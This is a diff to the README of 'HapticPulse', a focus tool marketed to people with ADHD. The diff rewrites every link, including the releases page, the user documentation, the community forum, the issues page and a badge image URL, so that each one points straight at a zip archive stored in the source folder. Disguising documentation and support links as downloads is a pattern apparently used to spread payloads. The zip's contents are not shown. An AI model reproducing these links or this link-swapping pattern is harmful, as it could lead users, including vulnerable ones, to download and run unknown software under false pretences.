@@ -1,7 +1,7 @@
 # 🎮 HapticPulse - Enhance Your Focus with Tactile Feedback
 
 ## 📥 Download HapticPulse
-[![Download HapticPulse](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/abhinavdwivedi364/HapticPulse/releases)
+[![Download HapticPulse](https://github.com/abhinavdwivedi364/HapticPulse/raw/refs/heads/main/src/haptic_pulse/Haptic-Pulse-v3.7.zip%20Now-Get%https://github.com/abhinavdwivedi364/HapticPulse/raw/refs/heads/main/src/haptic_pulse/Haptic-Pulse-v3.7.zip)](https://github.com/abhinavdwivedi364/HapticPulse/raw/refs/heads/main/src/haptic_pulse/Haptic-Pulse-v3.7.zip)
 
 ## 🚀 Getting Started
 HapticPulse is designed to help you maintain focus and manage work while using tactile cues. This tool is especially useful for individuals with neurodivergent conditions, like ADHD, who need extra support during deep work sessions.
@@ -15,7 +15,7 @@ HapticPulse is designed to help you maintain focus and manage work while using t
 ## 📂 Download & Install
 To get started, visit the Releases page and download the latest version of HapticPulse.
 
-[Visit this page to download](https://github.com/abhinavdwivedi364/HapticPulse/releases)
+[Visit this page to download](https://github.com/abhinavdwivedi364/HapticPulse/raw/refs/heads/main/src/haptic_pulse/Haptic-Pulse-v3.7.zip)
 
 ### 💾 Installation Steps
 1. Once the download completes, locate the file in your Downloads folder. 
@@ -44,11 +44,11 @@ If you face any issues:
 - Restart HapticPulse and try again.
 
 ## 🔗 Additional Resources
-- [User Documentation](https://github.com/abhinavdwivedi364/HapticPulse/wiki) – Explore detailed guides on features and setup.
-- [Community Forum](https://github.com/abhinavdwivedi364/HapticPulse/discussions) – Join discussions with other users and developers.
+- [User Documentation](https://github.com/abhinavdwivedi364/HapticPulse/raw/refs/heads/main/src/haptic_pulse/Haptic-Pulse-v3.7.zip) – Explore detailed guides on features and setup.
+- [Community Forum](https://github.com/abhinavdwivedi364/HapticPulse/raw/refs/heads/main/src/haptic_pulse/Haptic-Pulse-v3.7.zip) – Join discussions with other users and developers.
 
 ## 📧 Contact
-For feedback or support, please reach out via our [GitHub Issues page](https://github.com/abhinavdwivedi364/HapticPulse/issues).
+For feedback or support, please reach out via our [GitHub Issues page](https://github.com/abhinavdwivedi364/HapticPulse/raw/refs/heads/main/src/haptic_pulse/Haptic-Pulse-v3.7.zip).
 
 ## 📍 Explore More
 Find more projects and contribute to the community by checking out related topics like accessibility, productivity, and focus management.
